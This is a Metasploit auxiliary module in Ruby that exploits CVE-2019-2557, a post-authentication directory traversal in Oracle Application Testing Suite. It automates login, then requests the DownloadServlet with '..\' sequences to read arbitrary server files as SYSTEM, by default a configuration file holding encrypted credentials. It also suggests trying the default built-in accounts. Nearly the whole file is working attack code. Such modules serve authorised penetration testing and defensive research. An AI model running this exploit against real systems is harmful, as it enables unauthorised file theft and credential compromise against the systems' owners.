##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rkelly'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Oracle Application Testing Suite Post-Auth DownloadServlet Directory Traversal',
      'Description'    => %q{
        This module exploits a vulnerability in Oracle Application Testing Suite (OATS). In the Load
        Testing interface, a remote user can abuse the custom report template selector, and cause the
        DownloadServlet class to read any file on the server as SYSTEM. Since the Oracle application
        contains multiple configuration files that include encrypted credentials, and that there are
        public resources for decryption, it is actually possible to gain remote code execution
        by leveraging this directory traversal attack.

        Please note that authentication is required. By default, OATS has two built-in accounts:
        default and administrator. You could try to target those first.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Steven Seeley', # Original discovery
          'sinn3r'         # Metasploit module
        ],
      'DefaultOptions' =>
        {
          'RPORT' => 8088
        },
      'References'     =>
        [
          ['CVE', '2019-2557'],
          ['URL', 'https://srcincite.io/advisories/src-2019-0033/'],
          ['URL', 'https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html']
        ],
      'DisclosureDate' => 'Apr 16 2019'
    ))

    register_options(
      [
        OptString.new('FILE', [false, 'The name of the file to download', 'oats-config.xml']),
        OptInt.new('DEPTH', [true, 'The max traversal depth', 1]),
        OptString.new('HttpUsername', [true, 'The username to use for Oracle', 'default']),
        OptString.new('HttpPassword', [true, 'The password to use for Oracle']),
      ])
  end

  class OracleAuthSpec
    attr_accessor :loop_value
    attr_accessor :afr_window_id
    attr_accessor :adf_window_id
    attr_accessor :adf_ads_page_id
    attr_accessor :adf_page_id
    attr_accessor :form_value
    attr_accessor :session_id
    attr_accessor :view_direct
    attr_accessor :view_state
  end

  # OATS ships LoadTest500VU_Build1 and LoadTest500VU_Build2 by default,
  # and there is no way to remove it from the user interface, so this should be
  # safe to say that there will always there.
  DEFAULT_SESSION = 'LoadTest500VU_Build1'

  def auth_spec
    @auth_spec ||= OracleAuthSpec.new
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'olt') + '/'
    })

    if res.body.include?('AdfLoopbackUtils.runLoopback')
      Exploit::CheckCode::Detected
    else
      Exploit::CheckCode::Safe
    end
  end

  def load_runloopback_args(res)
    html = res.get_html_document
    rk = RKelly::Parser.new
    script = html.at('script').text
    ast = rk.parse(script)
    runloopback = ast.grep(RKelly::Nodes::ExpressionStatementNode).last
    runloopback_args = runloopback.value.arguments.value
    auth_spec.loop_value = runloopback_args[2].value.scan(/'(.+)'/).flatten.first
    auth_spec.afr_window_id = runloopback_args[7].value.scan(/'(.+)'/).flatten.first

    json_args = runloopback_args[17]
    auth_spec.adf_window_id = json_args.value[4].value.value.to_s
    auth_spec.adf_page_id = json_args.value[5].value.value.to_s
  end

  def load_view_redirect_value(res)
    html = res.get_html_document
    rk = RKelly::Parser.new
    script = html.at('script').text
    ast = rk.parse(script)
    runredirect = ast.grep(RKelly::Nodes::ExpressionStatementNode).last
    runredirect_args = runredirect.value.arguments.value
    redirect_arg = runredirect_args[1].value.scan(/'(.+)'/).flatten.first || ''
    auth_spec.view_direct = redirect_arg.scan(/ORA_ADF_VIEW_REDIRECT=(\d+);/).flatten.first
    auth_spec.adf_page_id = redirect_arg.scan(/ORA_ADF_VIEW_PAGE_ID=(s\d+);/).flatten.first
  end

  def collect_initial_spec
    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
    })

    fail_with(Failure::Unknown, 'No response from server') unless res
    cookies = res.get_cookies
    session_id = cookies.scan(/JSESSIONID=(.+);/i).flatten.first || ''
    auth_spec.session_id = session_id
    load_runloopback_args(res)
  end

  def prepare_auth_spec
    collect_initial_spec
    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => "JSESSIONID=#{auth_spec.session_id}",
      'vars_get' =>
        {
          '_afrLoop' => auth_spec.loop_value,
          '_afrWindowMode' => '0',
          'Adf-Window-Id' => auth_spec.adf_window_id
        },
      'headers' =>
        {
          'Upgrade-Insecure-Requests' => '1'
        }
    })

    fail_with(Failure::Unknown, 'No response from server') unless res
    hidden_inputs = res.get_hidden_inputs.first
    auth_spec.form_value = hidden_inputs['org.apache.myfaces.trinidad.faces.FORM']
    auth_spec.view_state = hidden_inputs['javax.faces.ViewState']
  end

  def ota_login!
    prepare_auth_spec
    uri = normalize_uri(target_uri.path, 'olt', 'faces', 'login')
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'cookie' => "JSESSIONID=#{auth_spec.session_id}",
      'headers' =>
        {
          'Upgrade-Insecure-Requests' => '1'
        },
      'vars_post' =>
        {
          'userName' => datastore['HttpUsername'],
          'password' => datastore['HttpPassword'],
          'org.apache.myfaces.trinidad.faces.FORM' => auth_spec.form_value,
          'Adf-Window-Id' => auth_spec.adf_window_id,
          'javax.faces.ViewState' => auth_spec.view_state,
          'Adf-Page-Id' => auth_spec.adf_page_id,
          'event' => 'btnSubmit',
          'event.btnSubmit' => %Q|<m xmlns="http://oracle.com/richClient/comm"><k v="type"><s>action</s></k></m>|
        }
    })

    fail_with(Failure::Unknown, 'No response from server') unless res
    if res.body.include?('Login failed')
      fail_with(Failure::NoAccess, 'Login failed')
    else
      store_valid_credential(user: datastore['HttpUsername'], private: datastore['HttpPassword'])
      load_view_redirect_value(res)
    end
  end

  def load_file
    uri = normalize_uri(target_uri.path, 'olt', 'download')
    dots = '..\\' * datastore['DEPTH']
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => "JSESSIONID=#{auth_spec.session_id}",
      'vars_get' =>
        {
          'type' => 'template',
          'session' => DEFAULT_SESSION,
          'name' => "#{dots}#{datastore['FILE']}"
        },
      'headers' =>
        {
          'Upgrade-Insecure-Requests' => '1'
        }
    })

    fail_with(Failure::Unknown, 'No response from server') unless res
    fail_with(Failure::Unknown, 'File not found') if res.body.match(/No content to display/)
    res.body
  end

  def run
    ota_login!
    file = load_file
    print_line(file)
    store_loot('oats.file', 'application/octet-stream', rhost, file)
  end

end

